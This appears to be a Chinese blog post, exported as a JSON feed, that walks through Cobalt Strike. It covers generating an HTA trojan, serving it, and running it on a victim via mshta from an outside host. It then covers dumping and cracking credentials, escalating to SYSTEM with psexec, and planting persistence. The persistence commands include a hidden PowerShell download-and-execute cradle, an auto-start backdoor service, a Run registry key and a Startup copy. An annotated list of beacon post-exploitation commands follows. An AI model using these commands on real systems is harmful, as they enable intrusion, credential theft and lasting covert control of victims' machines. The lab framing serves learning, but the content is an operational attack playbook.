{
    "version": "https://jsonfeed.org/version/1",
    "title": "Go Forward • All posts by \"coablt strike总结\" tag",
    "description": "欢迎来到我的博客(*^﹏^*),本人为新人,你可以阅读我的学习笔记并提出独到的见解~我们将互相学习,共同进步,望大佬们勿喷",
    "home_page_url": "https://chungod.github.io",
    "items": [
        {
            "id": "https://chungod.github.io/2021/08/18/Coablt%20strike%E6%80%BB%E7%BB%93/",
            "url": "https://chungod.github.io/2021/08/18/Coablt%20strike%E6%80%BB%E7%BB%93/",
            "title": "Coablt strike总结",
            "date_published": "2021-08-18T11:19:41.000Z",
            "content_html": "<h2 id=\"coablt-strike总结\"><a class=\"markdownIt-Anchor\" href=\"#coablt-strike总结\">#</a> Coablt strike 总结</h2>\n<p>介绍</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Cobalt Strike是一款渗透测试神器，常被业界人称为CS神器。Cobalt Strike已经不再使用MSF而是作为单独的平台使用，它分为客户端与服务端，服务端是一个，客户端可以有多个，可被团队进行分布式协团操作。</span><br><span class=\"line\"></span><br><span class=\"line\">Cobalt Strike集成了端口转发、扫描多模式端口Listener、Windows exe程序生成、Windows dll动态链接库生成、java程序生成、office宏代码生成，包括站点克隆获取浏览器的相关信息等。</span><br></pre></td></tr></table></figure>\n<p>Kali 启动 Coablt strike</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">./teamserver 服务器IP地址 密码</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"https://gitee.com/chungod/picture/raw/master/image/image-20210511144225129.png\" alt=\"image-20210511144225129\"></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">kali 利用java 命令进行连接</span><br><span class=\"line\">java -XX:+AggressiveHeap -XX:+UseParallelGC -jar cobaltstrike.jar  </span><br><span class=\"line\">或者./cobaltstrike 运行 </span><br></pre></td></tr></table></figure>\n<p><img data-src=\"https://gitee.com/chungod/picture/raw/master/image/image-20210511144911782.png\" alt=\"image-20210511144911782\"></p>\n<h3 id=\"参数介绍\"><a class=\"markdownIt-Anchor\" href=\"#参数介绍\">#</a> 参数介绍</h3>\n<p><strong>Cobalt Strike</strong></p>\n<p><img data-src=\"https://gitee.com/chungod/picture/raw/master/image/image-20210511145541631.png\" alt=\"image-20210511145541631\"></p>\n<p><strong>View</strong></p>\n<p><img data-src=\"https://gitee.com/chungod/picture/raw/master/image/image-20210511150003413.png\" alt=\"image-20210511150003413\"></p>\n<p><strong>Attacks</strong></p>\n<p>Packages</p>\n<p><img data-src=\"https://gitee.com/chungod/picture/raw/master/image/image-20210511150259624.png\" alt=\"image-20210511150259624\"></p>\n<p><strong>Web Drive-by</strong></p>\n<p><img data-src=\"https://gitee.com/chungod/picture/raw/master/image/image-20210511150711981.png\" alt=\"image-20210511150711981\"></p>\n<p><strong>Help</strong></p>\n<p><img data-src=\"https://gitee.com/chungod/picture/raw/master/image/image-20210511150856139.png\" alt=\"image-20210511150856139\"></p>\n<h3 id=\"工具栏详解\"><a class=\"markdownIt-Anchor\" href=\"#工具栏详解\">#</a> 工具栏详解</h3>\n<p><img data-src=\"https://gitee.com/chungod/picture/raw/master/image/image-20210511151221296.png\" alt=\"image-20210511151221296\"></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">1.新建连接</span><br><span class=\"line\">2.断开当前连接</span><br><span class=\"line\">3.监听器</span><br><span class=\"line\">4.改变视图为Pivot Graph(视图列表)</span><br><span class=\"line\">5.改变视图为Session Table(会话列表)</span><br><span class=\"line\">6.改变视图为Target Table(目标列表)</span><br><span class=\"line\">7.显示所有以获取的受害主机的凭证</span><br><span class=\"line\">8.查看已下载文件</span><br><span class=\"line\">9.查看键盘记录结果</span><br><span class=\"line\">10.查看屏幕截图</span><br><span class=\"line\">11.生成无状态的可执行exe木马</span><br><span class=\"line\">12.使用java自签名的程序进行钓鱼攻击</span><br><span class=\"line\">13.生成office宏病毒文件</span><br><span class=\"line\">14.为payload提供web服务以便下载和执行</span><br><span class=\"line\">15.提供文件下载，可以选择Mime类型</span><br><span class=\"line\">16.管理Cobalt Strike上运行的web服务</span><br><span class=\"line\">17.帮助</span><br><span class=\"line\">18.关于</span><br></pre></td></tr></table></figure>\n<h3 id=\"创建监听器\"><a class=\"markdownIt-Anchor\" href=\"#创建监听器\">#</a> 创建监听器</h3>\n<p>点击 Cobalt Strike -&gt; Listeners-&gt;Add，其中内置了九个 Listener</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">windows/beacon_dns/reverse_dns_txtwindows/beacon_dns/reverse_http</span><br><span class=\"line\">windows/beacon_http/reverse_http</span><br><span class=\"line\">windows/beacon_https/reverse_https</span><br><span class=\"line\">windows/beacon_smb/bind_pipe</span><br><span class=\"line\">windows/foreign/reverse_dns_txt</span><br><span class=\"line\">windows/foreign/reverse_http</span><br><span class=\"line\">windows/foreign/reverse_https</span><br><span class=\"line\">windows/foreign/reverse_tcp</span><br></pre></td></tr></table></figure>\n<p>其中 windows/beacon 为内置监听器，包括 dns、http、https、smb 四种方式的监听器；windows/foreign 为外部监听器，配合 Metasploit 或者 Armitage 的监听器。</p>\n<p><img data-src=\"https://gitee.com/chungod/picture/raw/master/image/image-20210511152311685.png\" alt=\"image-20210511152311685\"></p>\n<p>保存后生成监听器</p>\n<p><img data-src=\"https://gitee.com/chungod/picture/raw/master/image/image-20210511152348673.png\" alt=\"image-20210511152348673\"></p>\n<h3 id=\"生成木马\"><a class=\"markdownIt-Anchor\" href=\"#生成木马\">#</a> 生成木马</h3>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">点击Attacks-&gt;Packages-&gt;HTML Application，选择对应的监听器，方法这里有三种(executable/VBA/powershell)，选择powershell，点击Generate生成，选择生成的路径及文件名保存即可</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"https://gitee.com/chungod/picture/raw/master/image/image-20210511152917868.png\" alt=\"image-20210511152917868\"></p>\n<p><img data-src=\"https://gitee.com/chungod/picture/raw/master/image/image-20210511152934569.png\" alt=\"image-20210511152934569\"></p>\n<h3 id=\"开启web服务\"><a class=\"markdownIt-Anchor\" href=\"#开启web服务\">#</a> 开启 Web 服务</h3>\n<p>点击 Attacks-&gt;Web Drive-by-&gt;Host File，选择刚刚生成的木马 evil.hta，点击 Launch 生成下载链接</p>\n<p><img data-src=\"https://gitee.com/chungod/picture/raw/master/image/image-20210511153215301.png\" alt=\"image-20210511153215301\"></p>\n<p><img data-src=\"https://gitee.com/chungod/picture/raw/master/image/image-20210511153236256.png\" alt=\"image-20210511153236256\"></p>\n<h3 id=\"运行木马\"><a class=\"markdownIt-Anchor\" href=\"#运行木马\">#</a> 运行木马</h3>\n<p>打开受害机 cmd，运行 mshta 命令。mshta.exe 是微软 Windows 操作系统相关程序，用于执行.HTA 文件。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">mshta http://10.7.7.7/download/file.ext</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"https://gitee.com/chungod/picture/raw/master/image/image-20210511164256818.png\" alt=\"image-20210511164256818\"></p>\n<p>返回 CS 即可看到肉鸡上线</p>\n<p><img data-src=\"https://gitee.com/chungod/picture/raw/master/image/image-20210511164319933.png\" alt=\"image-20210511164319933\"></p>\n<p>选中受害机右击，选择 interact，即可进行交互，由于受害机默认 60 秒进行一次回传，为了实验效果我们这里把时间设置成 5，但实际中频率不宜过快，容易被发现。</p>\n<p><img data-src=\"https://gitee.com/chungod/picture/raw/master/image/image-20210511164402862.png\" alt=\"image-20210511164402862\"></p>\n<h3 id=\"端口扫描\"><a class=\"markdownIt-Anchor\" href=\"#端口扫描\">#</a> 端口扫描</h3>\n<p>右键一个 beacon，选择目标–&gt; 端口扫描或在 beacon 中使用命令 portscan [ip] 命令 随后 Cobaltstrike 会自动识别目标机所在的内网 ip 段，可选择 ARP，ICMP，none 三种方式进行扫描，ports 中填入你要扫描的端口</p>\n<p><img data-src=\"https://gitee.com/chungod/picture/raw/master/image/image-20210511195725297.png\" alt=\"image-20210511195725297\"></p>\n<p><img data-src=\"https://gitee.com/chungod/picture/raw/master/image/image-20210511195752693.png\" alt=\"image-20210511195752693\"></p>\n<p>查看到扫描到的</p>\n<p><img data-src=\"https://gitee.com/chungod/picture/raw/master/image/image-20210511200136133.png\" alt=\"image-20210511200136133\"></p>\n<p><img data-src=\"https://gitee.com/chungod/picture/raw/master/image/image-20210511200111358.png\" alt=\"image-20210511200111358\"></p>\n<h3 id=\"导出报告\"><a class=\"markdownIt-Anchor\" href=\"#导出报告\">#</a> 导出报告</h3>\n<p>点击 Reporting-&gt;Activity Report，导出默认 PDF 文档</p>\n<p><img data-src=\"https://gitee.com/chungod/picture/raw/master/image/image-20210511164511677.png\" alt=\"image-20210511164511677\"></p>\n<h3 id=\"提取密码\"><a class=\"markdownIt-Anchor\" href=\"#提取密码\">#</a> 提取密码</h3>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">hashdump 提取hash</span><br><span class=\"line\">logonpasswords 破解密码</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"https://gitee.com/chungod/picture/raw/master/image/image-20210511200913602.png\" alt=\"image-20210511200913602\"></p>\n<p>查看破解的密码</p>\n<p><img data-src=\"https://gitee.com/chungod/picture/raw/master/image/image-20210511201314538.png\" alt=\"image-20210511201314538\"></p>\n<h3 id=\"权限提升\"><a class=\"markdownIt-Anchor\" href=\"#权限提升\">#</a> 权限提升</h3>\n<p>利用 Spawn As 监听一个 SMB</p>\n<p><img data-src=\"https://gitee.com/chungod/picture/raw/master/image/image-20210511201644913.png\" alt=\"image-20210511201644913\"></p>\n<p><img data-src=\"https://gitee.com/chungod/picture/raw/master/image/image-20210511201727530.png\" alt=\"image-20210511201727530\"></p>\n<p><img data-src=\"https://gitee.com/chungod/picture/raw/master/image/image-20210511201851959.png\" alt=\"image-20210511201851959\"></p>\n<p><code>·进入Target</code>  使用 psexec 来提升权限</p>\n<p><img data-src=\"https://gitee.com/chungod/picture/raw/master/image/image-20210511202023537.png\" alt=\"image-20210511202023537\"></p>\n<p><img data-src=\"https://gitee.com/chungod/picture/raw/master/image/image-20210511202113089.png\" alt=\"image-20210511202113089\"></p>\n<p>成功提权 system 权限</p>\n<p><img data-src=\"https://gitee.com/chungod/picture/raw/master/image/image-20210511202405390.png\" alt=\"image-20210511202405390\"></p>\n<p>尝试利用 exp 进行提权</p>\n<p><img data-src=\"https://gitee.com/chungod/picture/raw/master/image/image-20210511212157786.png\" alt=\"image-20210511212157786\"></p>\n<h3 id=\"权限维持\"><a class=\"markdownIt-Anchor\" href=\"#权限维持\">#</a> 权限维持</h3>\n<p>先创建一个监听后门</p>\n<p><img data-src=\"https://gitee.com/chungod/picture/raw/master/image/image-20210511212340086.png\" alt=\"image-20210511212340086\"></p>\n<p><img data-src=\"https://gitee.com/chungod/picture/raw/master/image/image-20210511212458648.png\" alt=\"image-20210511212458648\"></p>\n<p>将其复制出来</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">powershell.exe -nop -w hidden -c &quot;IEX ((new-object net.webclient).downloadstring(&#x27;http://10.7.7.7:80/d&#x27;))&quot;</span><br></pre></td></tr></table></figure>\n<p>利用 <code>SC</code>  命令创建 windows 服务名，设置为开机自启</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">shell sc create &quot;name&quot; binpath= &quot;cmd /c start powershell.exe -nop -w hidden -c \\&quot;IEX ((new-object net.webclient).downloadstring(&#x27;http://10.7.7.7:80/d&#x27;))\\&quot;</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"https://gitee.com/chungod/picture/raw/master/image/image-20210511213150659.png\" alt=\"image-20210511213150659\"></p>\n<p><strong>通过可执行文件留下维持权限的后门</strong></p>\n<p>首先需要在目标主机上传一个木马，记住路径，然后对目标主机执行 beacon 命令</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">shell sc create &quot;backdoor&quot; binpath= &quot;C:\\Users\\Administrator\\Desktop\\backdoor.exe（填写自己木马的路径）&quot;</span><br><span class=\"line\"></span><br><span class=\"line\">sc description &quot;backdoor&quot;   &quot;description&quot; 设置服务的描述字符串</span><br><span class=\"line\">sc config &quot;server power&quot; start= auto 设置这个服务为自动启动</span><br><span class=\"line\">net start &quot;server power&quot; 启动服务 </span><br></pre></td></tr></table></figure>\n<p>注册表留后门</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">reg add HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run /v &quot;Keyname&quot; /t REG_SZ /d &quot;C:\\backdoor.exe&quot;（自己木马路径） /f </span><br></pre></td></tr></table></figure>\n<p>把后门加到开机启动:</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">shell copy backdoor.exe &quot;%userprofile%\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\&quot;</span><br></pre></td></tr></table></figure>\n<h3 id=\"beacon\"><a class=\"markdownIt-Anchor\" href=\"#beacon\">#</a> Beacon</h3>\n<p>当受害机上线以后，右击选择 Interact，就可以打开 Beacon Console<br>\n 在 beacon 处输入 help 可以看到命令说明</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Beacon Commands</span><br><span class=\"line\">===============</span><br><span class=\"line\"></span><br><span class=\"line\">    Command                   Description</span><br><span class=\"line\">    -------                   -----------</span><br><span class=\"line\">    argue                     进程参数欺骗</span><br><span class=\"line\">    blockdlls                 在子进程中阻止非Microsoft的DLLs文件</span><br><span class=\"line\">    browserpivot              注入受害者浏览器进程</span><br><span class=\"line\">    bypassuac                 绕过UAC</span><br><span class=\"line\">    cancel                    取消正在进行的下载</span><br><span class=\"line\">    cd                        切换目录</span><br><span class=\"line\">    checkin                   强制让被控端回连一次</span><br><span class=\"line\">    clear                     清除beacon内部的任务队列</span><br><span class=\"line\">    connect                   通过TCP连接到Beacon</span><br><span class=\"line\">    covertvpn                 部署Covert VPN客户端</span><br><span class=\"line\">    cp                        复制文件</span><br><span class=\"line\">    dcsync                    从DC中提取密码哈希</span><br><span class=\"line\">    desktop                   远程VNC</span><br><span class=\"line\">    dllinject                 反射DLL注入进程</span><br><span class=\"line\">    dllload                   使用LoadLibrary将DLL加载到进程中</span><br><span class=\"line\">    download                  下载文件</span><br><span class=\"line\">    downloads                 列出正在进行的文件下载</span><br><span class=\"line\">    drives                    列出目标盘符</span><br><span class=\"line\">    elevate                   尝试提权</span><br><span class=\"line\">    execute                   在目标上执行程序(无输出)</span><br><span class=\"line\">    execute-assembly          在目标上内存中执行本地.NET程序</span><br><span class=\"line\">    exit                      退出beacon</span><br><span class=\"line\">    getprivs                  对当前令牌启用系统权限</span><br><span class=\"line\">    getsystem                 尝试获取SYSTEM权限</span><br><span class=\"line\">    getuid                    获取用户ID</span><br><span class=\"line\">    hashdump                  转储密码哈希值</span><br><span class=\"line\">    help                      帮助</span><br><span class=\"line\">    inject                    在特定进程中生成会话</span><br><span class=\"line\">    jobkill                   杀死一个后台任务</span><br><span class=\"line\">    jobs                      列出后台任务</span><br><span class=\"line\">    kerberos_ccache_use       从ccache文件中导入票据应用于此会话</span><br><span class=\"line\">    kerberos_ticket_purge     清除当前会话的票据</span><br><span class=\"line\">    kerberos_ticket_use       从ticket文件中导入票据应用于此会话</span><br><span class=\"line\">    keylogger                 键盘记录</span><br><span class=\"line\">    kill                      结束进程</span><br><span class=\"line\">    link                      通过命名管道连接到Beacon</span><br><span class=\"line\">    logonpasswords            使用mimikatz转储凭据和哈希值</span><br><span class=\"line\">    ls                        列出文件</span><br><span class=\"line\">    make_token                创建令牌以传递凭据</span><br><span class=\"line\">    mimikatz                  运行mimikatz</span><br><span class=\"line\">    mkdir                     创建一个目录</span><br><span class=\"line\">    mode dns                  使用DNS A作为通信通道(仅限DNS beacon)</span><br><span class=\"line\">    mode dns-txt              使用DNS TXT作为通信通道(仅限D beacon)</span><br><span class=\"line\">    mode dns6                 使用DNS AAAA作为通信通道(仅限DNS beacon)</span><br><span class=\"line\">    mode http                 使用HTTP作为通信通道</span><br><span class=\"line\">    mv                        移动文件</span><br><span class=\"line\">    net                       net命令</span><br><span class=\"line\">    note                      给当前目标机器备注       </span><br><span class=\"line\">    portscan                  进行端口扫描</span><br><span class=\"line\">    powerpick                 通过Unmanaged PowerShell执行命令</span><br><span class=\"line\">    powershell                通过powershell.exe执行命令</span><br><span class=\"line\">    powershell-import         导入powershell脚本</span><br><span class=\"line\">    ppid                      为生成的post-ex任务设置父PID</span><br><span class=\"line\">    ps                        显示进程列表</span><br><span class=\"line\">    psexec                    使用服务在主机上生成会话</span><br><span class=\"line\">    psexec_psh                使用PowerShell在主机上生成会话</span><br><span class=\"line\">    psinject                  在特定进程中执行PowerShell命令</span><br><span class=\"line\">    pth                       使用Mimikatz进行传递哈希</span><br><span class=\"line\">    pwd                       当前目录位置</span><br><span class=\"line\">    reg                       查询注册表</span><br><span class=\"line\">    rev2self                  恢复原始令牌</span><br><span class=\"line\">    rm                        删除文件或文件夹</span><br><span class=\"line\">    rportfwd                  端口转发</span><br><span class=\"line\">    run                       在目标上执行程序(返回输出)</span><br><span class=\"line\">    runas                     以另一个用户权限执行程序</span><br><span class=\"line\">    runasadmin                在高权限下执行程序</span><br><span class=\"line\">    runu                      在另一个PID下执行程序</span><br><span class=\"line\">    screenshot                屏幕截图</span><br><span class=\"line\">    setenv                    设置环境变量</span><br><span class=\"line\">    shell                     cmd执行命令</span><br><span class=\"line\">    shinject                  将shellcode注入进程</span><br><span class=\"line\">    shspawn                   生成进程并将shellcode注入其中</span><br><span class=\"line\">    sleep                     设置睡眠延迟时间</span><br><span class=\"line\">    socks                     启动SOCKS4代理</span><br><span class=\"line\">    socks stop                停止SOCKS4</span><br><span class=\"line\">    spawn                     生成一个会话 </span><br><span class=\"line\">    spawnas                   以其他用户身份生成会话</span><br><span class=\"line\">    spawnto                   将可执行程序注入进程</span><br><span class=\"line\">    spawnu                    在另一个PID下生成会话</span><br><span class=\"line\">    ssh                       使用ssh连接远程主机</span><br><span class=\"line\">    ssh-key                   使用密钥连接远程主机</span><br><span class=\"line\">    steal_token               从进程中窃取令牌</span><br><span class=\"line\">    timestomp                 将一个文件时间戳应用到另一个文件</span><br><span class=\"line\">    unlink                    断开与Beacon的连接</span><br><span class=\"line\">    upload                    上传文件</span><br><span class=\"line\">    wdigest                   使用mimikatz转储明文凭据</span><br><span class=\"line\">    winrm                     使用WinRM在主机上生成会话</span><br><span class=\"line\">    wmi                       使用WMI在主机上生成会话</span><br></pre></td></tr></table></figure>\n<p>可用 help + 命令的方式查看具体命令参数说明</p>\n<p><img data-src=\"https://gitee.com/chungod/picture/raw/master/image/image-20210511164648825.png\" alt=\"image-20210511164648825\"></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">之前说过CS与受害机默认60s进行一次交互，为了方便实验我们可以把时间设置为0</span><br><span class=\"line\">beacon&gt;sleep 0</span><br></pre></td></tr></table></figure>\n",
            "tags": [
                "Coablt strike总结"
            ]
        }
    ]
}